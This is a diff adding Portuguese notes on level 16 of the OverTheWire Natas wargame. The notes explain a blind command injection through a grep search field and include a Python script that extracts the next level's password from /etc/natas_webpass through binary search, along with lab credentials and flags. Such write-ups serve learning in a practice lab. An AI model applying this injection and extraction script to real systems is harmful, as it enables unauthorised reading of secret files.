@@ -185,5 +185,65 @@ while (check(verify) == False):
 ```
 - Flag: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 
+Natas 16:
+- É um blind injection num grep
+- grep -i "<payload>" arquivo.txt
+- como payload dou um grep no arquivo da senha do natas17
+- ´$(grep -G^a /etc/natas_webpass/natas17)"´
+- ´-G´ para buscar com expressao regex
+- no exemplo se a letra a iniciar a senha do natas 17 ele vai buscar a senha no arquivo.txt
+e nao vai responder nada se nao comecar ele vai dar grep com string vazia e responder todo 
+o arquivo.txt, dessa aforma vou conseguindo fazer blind injection na senha
+- usei ´[abcd]´ do regex para fazer busca binaria na string de possiveis letras da senha
+´´´
+import requests
 
 
+def check(response):
+    if 'African' in response:
+        return False
+    return True
+
+def split(s):
+    half, rem = divmod(len(s), 2)
+    return s[:half + rem], s[half + rem:]
+
+url = "http://natas16.natas.labs.overthewire.org/"
+
+
+payload = ""
+headers = {
+    'Authorization': "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==",
+    }
+
+
+
+
+
+
+letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
+password = ""
+
+
+for i in range(32):
+    l = letters
+    while (True):
+        f, s = split(l)
+
+        needle = "African$(grep -G ^"+password+"["+f+"]"+" /etc/natas_webpass/natas17)" 
+        querystring = {"needle":needle,"submit":"Search"}
+        response = requests.request("GET", url, data=payload, headers=headers, params=querystring)
+
+        if check(response.text):
+            l = f
+        else:
+            l = s
+        
+        print(password+l)
+        if len(l) == 1:
+            password += l
+            break
+
+print(password)
+´´´
+- Flag: ´8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw´
